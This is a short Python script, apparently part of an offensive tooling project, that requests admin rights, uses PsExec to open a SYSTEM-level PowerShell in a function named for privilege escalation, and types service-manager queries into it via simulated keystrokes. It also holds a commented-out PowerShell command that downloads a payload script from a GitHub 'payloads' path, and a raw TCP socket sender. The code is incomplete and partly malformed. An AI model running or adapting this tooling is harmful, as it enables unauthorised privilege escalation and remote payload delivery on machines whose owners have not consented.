import os
import sys
import time
import pyautogui
from multiprocessing import Process
from pyuac import main_requires_admin #add pyuac and pypiwin32 to requirements.txt

def priv_escaltion():
    #run exe file from path
    os.system("SysinternalsSuite\PsExec.exe -s powershell.exe")
    ##emulate user keypress to send alt+tab
    #pyautogui.keyDown('alt')
    #time.sleep(.2)
    #pyautogui.press('tab')
    #time.sleep(.2)
    #pyautogui.keyUp('alt')

def commands():
    time.sleep(4)
    pyautogui.write("sc.exe sdshow scmanager")
    pyautogui.press("enter")

    
    #os.system("powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CosmodiumCS/BlackOpal/main/payloads/update.sh', 'update.sh')")
   
def send_message(port, message):
    #send message
    os.system(f"powershell -c \"$c = New-Object System.Net.Sockets.TCPClient('127.0.0.1', {port});$c.Connect();$c.Send('{message}');$c.Disconnect()\"")
    


@main_requires_admin
def main():
    p1 = Process(target = priv_escaltion)
    p1.start()
    p2 = Process(target = commands)
    p2.start()
    

if __name__ == "__main__":
    main()